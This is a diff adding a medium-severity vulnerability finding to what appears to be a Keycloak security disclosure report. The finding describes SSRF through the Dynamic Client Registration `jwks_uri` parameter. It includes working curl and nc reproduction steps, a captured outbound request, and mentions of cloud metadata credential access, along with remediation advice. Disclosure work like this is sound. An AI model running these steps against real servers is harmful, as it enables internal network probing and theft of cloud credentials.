@@ -722,6 +722,121 @@ HTTP/1.1 403 Forbidden
 
 ---
 
+## Finding #6 — MEDIUM
+
+### Vulnerability Title
+**SSRF via Dynamic Client Registration `jwks_uri` — Low-Privilege Internal Network Probing**
+
+### Affected Component
+Keycloak Server — Dynamic Client Registration + JWT Client Authentication (`jwks_uri` fetch)
+
+### Affected Version
+26.5.4 (latest stable). Default DCR + JWT client authentication configuration.
+
+### Vulnerability Type
+Server-Side Request Forgery (SSRF) — lower privilege than Finding #4
+
+### CVSS Score (estimated)
+**6.5 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N
+
+---
+
+### Technical Description
+
+Dynamic Client Registration (RFC 7591) supports the `jwks_uri` parameter, allowing a client to specify an external URL from which Keycloak should fetch the client's JSON Web Key Set. When a client is registered with `token_endpoint_auth_method: private_key_jwt` and a `jwks_uri`, Keycloak makes a server-side HTTP GET request to that URI when validating a JWT client assertion.
+
+**The vulnerability:** Any authenticated realm user can register an OIDC client via DCR with an arbitrary `jwks_uri`. Triggering a JWT authentication attempt with this client causes Keycloak to make an outbound HTTP GET request to any URL — including internal network addresses, loopback, and cloud metadata endpoints.
+
+**Comparison with Finding #4 (SSRF via IdP import-config):**
+
+| Aspect | Finding #4 (IdP import-config) | Finding #6 (DCR jwks_uri) |
+|---|---|---|
+| Required privilege | `manage-identity-providers` realm role | **Any authenticated user** |
+| Trigger | Direct POST to admin API | DCR registration + JWT auth |
+| Target | OIDC discovery endpoint | Any URL (JWKS endpoint) |
+| User-Agent | Apache HttpClient | Apache HttpClient |
+
+**Impact:** Blind SSRF — Keycloak makes outbound HTTP GET to any attacker-specified URL. Error message analysis and timing differences allow internal port scanning.
+
+---
+
+### Preconditions
+
+1. Attacker has any valid realm user account (no special privileges required)
+2. DCR endpoint is available (default — enabled in all realms)
+
+---
+
+### Step-by-Step Reproduction
+
+**Step 1 — Attacker gets Bearer token (any realm user):**
+```bash
+ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
+  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+```
+
+**Step 2 — Register DCR client with internal jwks_uri:**
+```bash
+# Start listener to capture SSRF request
+nc -l -p 49990 > /tmp/ssrf_capture.log &
+
+# Register client with jwks_uri pointing to internal service
+curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
+  -H "Authorization: Bearer $ATTACKER_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "client_name": "ssrf-probe",
+    "redirect_uris": ["https://test.com/cb"],
+    "grant_types": ["client_credentials"],
+    "token_endpoint_auth_method": "private_key_jwt",
+    "jwks_uri": "http://127.0.0.1:49990/jwks.json"
+  }'
+# → HTTP 201 {"client_id":"edb7465c-...","jwks_uri":"http://127.0.0.1:49990/jwks.json"}
+CLIENT_ID=<from response>
+```
+
+**Step 3 — Trigger SSRF by authenticating with JWT assertion:**
+```bash
+curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
+  -d "client_id=$CLIENT_ID&grant_type=client_credentials&
+      client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&
+      client_assertion=<any.jwt.token>"
+```
+
+**Step 4 — Listener receives HTTP request from Keycloak:**
+```
+GET /jwks.json HTTP/1.1
+Host: 127.0.0.1:49990
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.10)
+Accept-Encoding: gzip,deflate
+```
+**← Keycloak made outbound HTTP GET to the internal address**
+
+**Automated PoC:** `bash poc7_dcr_jwks_ssrf.sh`
+
+---
+
+### Security Impact
+
+- **Internal network reconnaissance**: Attacker can probe internal hosts and port availability by registering clients with different `jwks_uri` targets and observing timing/error differences
+- **Cloud metadata access**: In cloud environments (AWS, GCP, Azure), the SSRF target can be the instance metadata service (169.254.169.254) to retrieve cloud credentials
+- **Interaction with unauthenticated internal services**: Any HTTP service accessible from the Keycloak server can be targeted
+- **Combined with Finding #5**: An attacker with a user account can simultaneously intercept other users' tokens (Finding #5) and probe internal infrastructure (Finding #6)
+
+---
+
+### Remediation Recommendation
+
+1. **Validate `jwks_uri` against an allowlist**: Only allow HTTPS URLs from trusted domains; block private IP ranges (RFC 1918), loopback, and link-local addresses before making the JWKS fetch
+2. **Apply the same SSRF protections as Finding #4**: Implement a shared URL validation utility for all server-side HTTP fetches
+3. **Require admin role for `jwks_uri` registration**: Add a DCR policy requiring the `manage-clients` role to register clients with `private_key_jwt` authentication method and external `jwks_uri`
+
+---
+
+---
+
 ## Test Environment Details
 
 | Property | Value |
